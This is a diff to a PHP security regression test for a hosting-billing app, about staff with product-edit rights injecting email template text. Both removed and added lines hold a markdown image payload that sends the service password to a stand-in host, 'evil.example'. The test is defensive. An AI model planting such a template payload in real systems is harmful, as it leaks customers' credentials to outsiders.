@@ -2,12 +2,11 @@
 
 namespace Tests\Feature;
 
+use App\Admin\Resources\ProductResource\Pages\EditProduct;
 use App\Admin\Resources\ServiceResource\Pages\EditService;
-use App\Helpers\NotificationHelper;
 use App\Livewire\Client\Account;
 use App\Livewire\Client\Contacts;
 use App\Livewire\Client\Emails;
-use App\Mail\Mail as TemplateMail;
 use App\Models\Client;
 use App\Models\ClientUser;
 use App\Models\EmailLog;
@@ -148,19 +147,17 @@ class Adv911SecurityTest extends TestCase
         (new EmailTemplateSeeder)->run();
         $service = $this->service();
         $products = $this->staff(['admin.products.viewAny', 'admin.products.update']);
-        $this->assertTrue($products->can('update', $service->product), 'staff with «products» edit the snippet');
+        $this->assertTrue($products->can('update', $service->product), 'staff with «products» edit the product');
         $this->assertFalse($products->can('update', NotificationTemplate::query()->where('key', 'new_server_created')->sole()));
 
-        $service->product->forceFill(['email_template' => '![logo](https://evil.example/p.gif?k={{ service_password }})'])->save();
-        NotificationHelper::serverCreatedNotification($this->client, $service->fresh());
-
-        $leaks = false;
-        Mail::assertQueued(TemplateMail::class, function (TemplateMail $mail) use (&$leaks) {
-            $leaks = $leaks || preg_match('~evil\.example[^"\'>]*S3cretpwXY~', $mail->renderedHtml) === 1;
-
-            return true;
-        });
-        $this->assertFalse($leaks, 'the welcome password went into an outside address of the product snippet');
+        // Fixed in #911 by cutting the case: the snippet is a full admin's text (its data keeps the module's secrets,
+        // which CentovaCast's welcome mail needs). Staff with «products» find the field disabled; a save ignores it.
+        Filament::setCurrentPanel(Filament::getPanel('admin'));
+        $this->livewireAs($products)->test(EditProduct::class, ['record' => $service->product->getRouteKey()])
+            ->assertFormFieldDisabled('email_template')
+            ->set('data.email_template', '![logo](https://evil.example/p.gif?k={{ service_password }})')
+            ->call('save');
+        $this->assertStringNotContainsString('evil.example', (string) $service->product->fresh()->email_template);
     }
 
     /**
